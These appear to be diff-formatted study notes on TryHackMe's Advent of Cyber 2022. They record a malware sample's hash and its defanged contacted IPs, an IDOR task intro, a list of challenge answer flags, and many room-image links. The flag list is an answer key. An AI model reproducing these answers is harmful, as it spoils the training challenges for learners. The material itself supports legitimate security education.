+0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f  mysterygift.exe
+```
+*0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f*
+Search the hash value of the executable file on VirusTotal.
+Navigate to the "Behaviour" section.
+There are multiple IP addresses associated with this file.
+What are the connected IP addresses?
+Enter the IP addressed defanged and in numerical order. (format: IPADDR,IPADDR)
+Please note that the VT entry changed since the official walkthrough video was recorded - check the VT website to get all the IP addresses you need!
+We're only interested in TCP connections here.
+https://www.virustotal.com/gui/file/0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f/behavior
+![[Pasted image 20221220122733.png]]
+```text
+-   20.99.133.109:443 (TCP)
+-   20.99.184.37:443 (TCP)
+-   23.216.147.64:443 (TCP)
+-   23.216.147.76:443 (TCP)
+
+using cyberchef
+```
+![[Pasted image 20221220122904.png]]
+*20[.]99[.]133[.]109,20[.]99[.]184[.]37,23[.]216[.]147[.]64,23[.]216[.]147[.]76*
+If you liked working with Wireshark, we have a comprehensive module on this helpful tool [here](https://tryhackme.com/module/wireshark). If you want to dive deeper, the [Network Security and Traffic Analysis](https://tryhackme.com/module/network-security-and-traffic-analysis) module is waiting for you!
+### [Day 14] Web Applications I'm dreaming of secure web apps
+The Story
+Check out Phillip Wylie's video walkthrough for Day 14 [here](https://www.youtube.com/watch?v=UlvYi7ae0G8)!
+Elf McSkidy was sipping her coffee when she saw on her calendar that it was time to review the web application’s security. An internal web application is being developed to be used internally and manage the cyber security team. She calls Elf Exploit McRed and asks him to check the in-development web application for common vulnerabilities. Elf Exploit McRed discovers that the local web application suffers from an Insecure Direct Object References (IDOR) vulnerability.
+
+## Flags / Answers
+- ***THM{IT'S A Y3T1 CHR1$TMA$}***
+- ***THM{4TT4CK SURF4C3 R3DUC3D}***
+- ***THM{EZ_fl@6!}***
+- ***THM{m0@r_5t3pS_n0w!}***
+- ***THM{B@d_Y3t1_1s_n@u6hty}***
+- ***THM{D3f3n5e_1n_D3pth_1s_k00L!!}***
+- ***THM{AoC2022!thank_you!}***
+- ***THM{STOLENSANTASLIST}***
+- ***THM{I_SEE_YOUR_SCREEN}***
+- ***THM{CLOSE_THE_DOOR}***
+- ***THM{Naughty.File.Uploads.Can.Get.You.RCE}***
+- ***THM{McCode, Elf McCode}***
+- ***THM{KodeNRoll}***
+- ***THM{Are we secure yet?}***
+- ***THM{SQLi_who???}***
+- ***THM{n0t_just_your_u$ser}***
+- ***THM{wh@t_1s_Runn1ng_H3r3}***
+- ***THM{sch3dule_0npo1nt_101}***
+- ***THM{Hacking.Hardware.Is.Fun}***
+- ***THM{WE_GOT_THE_FIRMWARE_CODE}***
+- ***THM{UR_CAMERA_IS_MINE}***
+- ***THM{47C61A0FA8738BA77308A8A600F88E4B}***
+- ![Task banner for day 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/775161b226fa81911c7978e48746031f.png)
+- ![Image showcasing the seven steps of the Cyber Kill Chain.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/1e0cdd3b3f3c33c18d67f25aad84e618.png)
+- ![A Yeti watching over Santa's Elves packing up gifts.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d6826e0cc43e07349bd59ef20a5ba222.png)-   **Reconnaissance**: The attacker performs research on the target using publicly available information.
+-   ![Yeti gathering gifts after gaining access to the warehouse.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/e39706bbb1ce71dce5da3b93343722f5.png)**
+- ![Yeti leaving Santa's warehouse happy with his loot.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/e2e5af4067e65918c2ce6827143cecb6.png)-   **Collection**: After finding the jackpot of data and information, the attacker will seek to aggregate all they need. By doing so, the assets’ confidentiality would be compromised entirely, especially when dealing with trade secrets and financial or personally identifiable information (PII) that is to be secured.
+- ![Santa's Blue Team Elves playing with Unified Kill Chain puzzle pieces.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/c0a5c0197614aad4d2ca911414683e7f.png)
+- ![an illustration depicting a wreath with ornaments](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/99e46fdf91a54c915db48e869a7eacc9.png)
+- ![a picture of ElfMcBlue](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/7761e06809d2456b1e4d5cea829a43e9.png)
+- What Does a Log File Look Like?![a blue-team elf holding a magnifying glass](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/451feadc05ed67051795a78d1fadc88b.png)
+- ![an annotated picture of an example of a log file](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/8953b78dae6d4c5755a4f145247f5adb.png)
+- ![a picture of the event viewer on Windows](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/50ae2577dcec3b3462b13c6225ba111d.png)
+- ﻿Grep 101![A blue-team elf holding a feather and notepad](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/383b21f8c928f96f5a6992c61e4c6249.png)
+- ![the logo of the BanditYeti APT group](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/246cf215894c93a1ac9da7ac8272c6dc.png)
+- Look through the log files for the flag. The format of the flag is: **THM{}**
+- ![Image for Banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/40fa3ad65ce9f79e1e87b60b3a5073dc.png)
+- ![Image for McSkidy](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4aac8c1a77653addeef33dac596e26fc.png)
+- ![Image for dorks](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/78095df3e60ffa72f618bf9e735c129b.png)
+- ![Image for GitHub](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/52968096eecbc3a4838b1b2ea88ef2cd.png)
+- ![Image for Google Dorks](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/fb8a9ed97723cfcc61dab5c77f70d10d.png)
+- ![Image for Database Hack](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/013ed1d5089a766f057c74be80e17f1c.png)
+- ![Image for Github Repositories](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/01cbf12bf2825395635bff6b7f0dac65.gif)
+- ![Task Banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0c6f1b24b436741244013b611f1fa28a.png)
+- ![Image for SMB](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d40267e21060a93362acbc4fc16e346.png)
+- ![Task banner for day 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/165eceb8febad51fea889be8b3141a9c.png)
+- ![Elf Recon McRed](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f0215c2cc5b0c9b5ee419bcaa98b8978.png)
+- ![Remmina can be launched from the Internet group in the Applications menu.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1729f676200d2e232474254d392dd8d1.png)
+- ![You can click cancel if asked to unlock your login keyring.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1f0cf436eed0c2743b7a400cd4fffb4.png)
+- ![To connect to a VNC server using Remmina, you need to select the VNC protocol and type the IP address of the target.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/14a98c766275f384149522d673a02399.png)
+- ![AoC Day 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/05efac424e76531bc2a88d0327d1df4a.png)
+- ![raw vs highlighed header](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f3e74d182c55d8c943609bbeaa99fcfd.png)
+- ![Open email file in a text editor](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/60c3da93bf82ac7d5cda9d31116edd84.png)
+- ![Change highlight syntax](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/59bdec958210eed28518803f3b6fe604.png)
+- ![Email reputation check](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/91616d2eb4be20f6118c056b0fce8a12.png)
+- ![VirusTotal](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c2c773b4d53b467950632c80649553f7.png)Once you get the sum of the file, you can go for further analysis using the **VirusTotal**.
+- ![Virustotal sections](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/d71085a61113f7bf87b31dcd0e40570c.png)
+- ![InQuest](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f7a0ebef6bbe5b127fe4787a5caf9811.png)
+- ![Shows AOC day 7 Image Head](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/02a402283ddc03c2afd62b0f31f722b3.png)
+- Learning Objectives![Cyberchef logo](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e00238f51f4e22b052fba6c422c3423d.png)
+- ![CyberChef Interface](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/47c75a03ac04b0c2922a1cbbcefad496.png)
+- ![Shows how to drag a file into CyberChef as input](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/44901d6b3afd7c63acf7c9c0c9c3e18b.gif)
+- ![Extract strings using strings function](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/12b35d2dcb21944881d978f6f65e8d42.gif)
+- ![Filter strings by the size using strings function](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/6e8e2cb719260599ed8a51843b34fa19.png)
+- ![Use Regex in Find/Replace to filter data](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/8c0b0f724002e6dc8457d8b7f095c486.png)
+- ![Use drop bytes to drop unwanted bytes](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/c1e177a5656640e25ef0c5a83990f8a7.png)
+- ![Use from Base64 to decode text from Base84 encoded value](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/309cbbd50b3b5e27e17677f96f04b069.png)
+- ![Decode to UTF-16LE using decode text function](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/0faa8f5668d9d998696aa8547d80c3b7.png)
+- ![Use regex within Find/Replace to filter data](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/da469d1dabcf929dbc1765d06917521d.png)
+- ![Shows usage of Find/Replace function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/938334f69a64ce058bd2046da3928114.png)
+- ![Use Replace/Replace function to replace chars](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/d71d6682328beec84e0948a6ade15c69.png)
+- ![Use Extract URLs function to extract URLs from the data](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/76d6badf89e2022315851487435f12f6.png)
+- ![Use split function to split lines](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/7f2239c965339cf309d101f6c8d713eb.png)
+- ![Use Defang to defang URLs to make them unclickable](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/58a58436becb51b25dbb13ebe56b9a02.png)
+- ![a day 8 banner illustration](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/107f2c680831cc1fa710767c34825e5a.png)
+- ![Diagram of deposit function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/7c206b5cd15dbb4ebd4d9dbbe420d905.png)
+- ![Diagram of withdraw function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2a1e2111efdc9b545b1abac86ef792ca.png)
+- ![Diagram of withdraw and other functions](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/667fe1f786b635b1153973a4a7c8703a.png)
+- ![Diagram of attack function depositing 1 ether](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/5f3c424d4d6fb10d1c375649d30c7035.png)
+- ![Diagram of withdraw function calling back to the attack function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c3a7d046821759f5237be1f1faab186e.png)
+- ![Diagram of the infinite loop between attack and withdraw function](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2f6c70c60729404d5a404de2c409a5a7.png)
+- ![Screenshot of deploy and run transactions menu of Remix IDE](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3d0ae9889e1addf60a1d6e79395c5bd0.png)
+- ***flag{411_ur_37h_15_m1n3}***
+- ![an illustration depicting a wreath with ornaments](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/847d9741b9d9aac8d9372989f4d93958.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/5289605c92c8f60838a479cba5848cb3.png)
+- ![Image of initial foothold between a pentester host and a compromised container](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed3f13d38407304044dd845/room-content/96b6f34691943493b36baed19bd4641a.png)
+- ![Image of pivoting using a compromised container to other endpoints on the network](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed3f13d38407304044dd845/room-content/81947d7cc301f1505f383089991cd3bc.png)
+- ![an image illustrating the location of the Kali VM launch button](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/04378b544195b1a61acf1fa4d035fd48.png)
+- ![an image illustrating the Kali VM and AttackBox launch buttons](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/580097ccb4d83610a881fe94e6cccf46.png)
+- ![an image illustrating the Kali VM launch button](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/a722607c5328f7ea8b014e9e3a02c669.png)
+- ![an image illustrating the Kali VM in split screen view](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/fa927cbf9072c8303dbc6a917f3f90a6.png)
+- ![Image of the discovered web application. The browser's network developer tools are open and the 'Set-Cookie: laravel_session' HTTP header is highlighted](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed3f13d38407304044dd845/room-content/657260c9b96783c5d2d193013578c100.png)
+- ![AoC day 10 banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cebaa8a8bc1647852b7488a611d3800d.png)
+- ![Elves in despair](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8ef207ff54fb2726ed9791aaa1e16f03.png)
+- ![Game memory layout](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e73c41674384b537096f1e800b3edd95.png)
+- ![Cetus Logo](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e4960f1f69afa78cb4d0aded93e8dc08.png)
+- ![Temporary Firefox Add-ons](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/af555c27570e44ae1bf8d39676fafb1b.png)
+- ![Firefox Cetus Loaded](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4034e1b27dc90e06b00c9a057e4e6a8.png)
+- ![Chrome Developer Mode](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0d33d33a53c1a9e04febc644514a80e6.png)
+- ![Chrome Open Cetus](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/82361c8235a71220e8fe22421a77daa0.png)
+- ![Chrome Cetus Loaded](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/abe3ea1a686f5b65484ff825e120501d.png)
+- ![Game Icon in Machine](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b706d58ce17041d4708ad2d640bd589.png)
+- ![Developer Tools](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e50b53bdb7f272a9b88f850197c90275.png)
+- ![Finding Cetus](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3a8732a7ac9e05b0f2bceed318142a35.png)
+- ![Cetus Interface](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/faaa4e72884c28021071797bc81e003c.png)
+- ![Guard random number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/86780fce97ef5e28dcbb3ca5d0948859.png)
+- ![Searching the guard's number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9f0ec4e56f19e3ff32c3fe24261c39fe.png)
+- ![Cetus Bookmarks](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/351ece705759930b84a3a1b6f021a54c.png)
+- ![Guessing the number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/febcff5c18091088aa94fc54bb3a0a5a.png)
+- ![The Bridge](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d874327f5f22f557ab32cdd5a6671d6b.png)
+- ![ElfRecon1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7d3f7a832da5cfe8d01245c6a4957daf.png)![Differential Search 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/21eb5bd08fe1523e02ef337b55ad9b78.png)
+- ![ElfRecon2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0f87691ac4d57ba14dca67c3229f6b29.png)![Differential Search 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/098df9dbaf2afef7a7659b3ed0caeb99.png)
+- ![Differential Search 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ac51390fdf80ae16f0b96a23f8808e1e.png)![ElfRecon3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ccc56738fc0010c83a6619415dfa9588.png)
+- What is Memory Forensics?![a picture of elf mcblue](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/670492e08f9b74a3c38a5f6f219d2cdf.png)
+- Why is Memory Forensics Useful?![An image of a computer memory chip](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/50fa29c68caf89f0e3df5d19cfd40acd.png)
+- ![A picture of Window's Task Manager](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/68217febd77dcd845ba608bb5ef6f34f.png)
+- ![A picture of the Bandit Yeti APT group logo](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/0365a56aba829ffc28205e4f3db0fbc2.png)
+- ![AoC Day 12 Banner.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cd742900576fe374b2b493a0b4355a2.png)
+- ![BOMB DISCOVERED!](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/899917d648d2dc56fdacb4a7c6384c2b.png)
+- With this, here are some helpful tips when handling live malware: ![Forensic McBlue to the rescue!](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2d2d07334ff4f2b031eb9809e11dc108.png)
+- ![Malware sample.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c445e08db1b099ba9a4b0034163ebb2b.png)﻿
+- ![Detect It Easy.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/18a26e0f910ee4e94f1310d7448d2349.png)
+- ![Detect it Easy (2).](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2f1640cd8c821c7daf8ae9e04502b85a.png)
+- ![CMD Taskbar.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/59ef6c9293acb4444b4f0a3583e7ff19.png)
+- ![Detect It Easy packer result.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0f07a743b05d98d28e32c6c2700659c8.png)
+- ![Taskbar tools.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b2b60dc0253ce37a52ee519cd7a8d63e.png)
+- ![ProcMon Filters.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ba3d3ff4ebdb70b61d9f46f7efc081c2.png)
+- ![ProcMon Filter Panel.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/795f4e9571af1fae9d4bb742ad13c8a5.png)
+- ![Exclude Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/868f1b11f87c2cf30aa7c924e3010538.png)
+- ![ProcMon Registry Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/eab9899da0795bfcd16a7b6d76950b5f.png)
+- ![ProcMon File System Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/26d9eb0b4bdaa5427e22c62b4c8b375f.png)
+- ![ProcMon Network Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5df70ef1f352bd85ed8120b3b72b0bf4.png)
+- ![AoC Day 13](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1893fdf9cd7a4530786f64fa5dad0825.png)
+- ![Wireshark file open](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/305ec782315c682aefeabf1de52d5c71.png)
+- ![Wireshark protocol hierarchy](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/691c28c05b1602462c5350e0f9a61cc4.png)
+- ![Wireshark conversations](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/889fa7ef773feb93dc4f6925cc46eb1b.png)
+- ![Detective Elf](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/aae52a7dddfb2baf5c042bab7ef48422.png)
+- ![Wireshark dns filter](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/fcd28b2747d0c620201d923443e553f4.png)
+- ![Wireshark http filter](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/cc58cfbbd1ef429365c806c3746ae94c.png)
+- ![Wireshark export objects](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/9cfd2f36bcc8a9b5883a2853d027614f.png)
+- After finishing all the shown steps and completing the required checks, you are finished with the fundamental packet analysis process of the given case. The following steps are creating a report of your findings and escalating the sample to the upper-level analysts, who will conduct a more in-depth analysis.![Bandit Yeti APT](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1a2c4c3e1b40bc65cec5b68d5c8d3176.png)
+- ![Task banner for day 14](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/283b841385da7500306091a326abee6e.png)
+- ![Figure showing IDOR vulnerability by changing the user ID in the URL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/25e3d597ebf6fad017293948506ba0d5.png)
+- ![Figure showing IDOR vulnerability by changing the download file ID in the URL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2fc139b18d3c20c61a4b406de1c6f5f6.png)
+- ![Figure showing IDOR vulnerability to reset a user's password by by changing the username in the URL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d395d2dee1ed1a747508ba1206ac195d.png)
+- ![Task banner for day 15](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c91bb57fb61ed3f3f0945b8d8446c612.png)
+- ![elf](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/60b72d9b64550b86f7cae2509c147c2e.png)Santa is looking to hire new staff for his security team and has hired a freelance developer to create a web application where potential candidates can upload their CVs. Elf McSkidy is aware that third-party risks can be serious and has tasked you, Exploit McRed, with testing this application before it goes live. Since the festivities are right around the corner, we will have to focus on the core feature of the website, namely the ability to upload a CV.
+- ![SantaSideKickWebsite](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6df11bf124fbe4180521bd48ea154b44.png)
+- ![SantaSideKickWebsite](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0254d6c92580a77c2676fcf0aca66645.png)
+- ![SantaSideKickWebsite](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/36d7f7c40c35070b084f637070deb147.png)
+- ![AoC day 16 banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/67234c28fa6771b3c6d6e39260be4c3e.png)
+- ![A database table](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bd97758d1b832dcbbaa1f8d68ae98650.png)
+- ![Simple select query](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b149b3ba14bf78a737f26772d0f8c7e5.png)
+- ![select specific columns](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cea1fa400777acd81f95e5b95ebb6054.png)
+- ![Using WHERE filters](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bcf89fa6f3dd293c319d29f19bfdb694.png)
+- ![Elf McSkidy Profile](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/14c35693f57e1001f03b84eaafab91c2.png)
+- ![Building dynamic queries](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a8f7cb56f722249c4e453f3de2c072c3.png)
+- ![SQL injection 101](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9172c99c0a762ac5500956cdf0f04629.png)
+- ![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f8eb6e78ad80791f4c2bc42c421364ba.png)
+- ![Code Editor Layout](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d25e248ac1ab1791a6316451ce65ab2f.png)
+- ![Run Checks Button](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d7f03c0848004a911875745dd0ca88e.png)
+- ![Building SQL Query by Concatenation](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94464c2dd10b21b108fe9b5fa5ed24f0.png)
+- ![Building SQL Queries via Prepared Statements](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b03ab555f94e432238a260e3557fb492.png)
+- ![Banner for Day 17](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/d05e1c8db9484ef8201231659ce26b0d.png)
+- ![Base Code](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/944be37798d52b534749b314d6c90849.png)
+- ![Edited Base Code to Include Type Attribute](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/a7484e2056785655394786a397857a5f.png)
+- ![Further Edit of Base Code to Include Semantic and Whitelisting Techniques](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/4b0203a837d72f92684f35c8bd1d00b6.png)
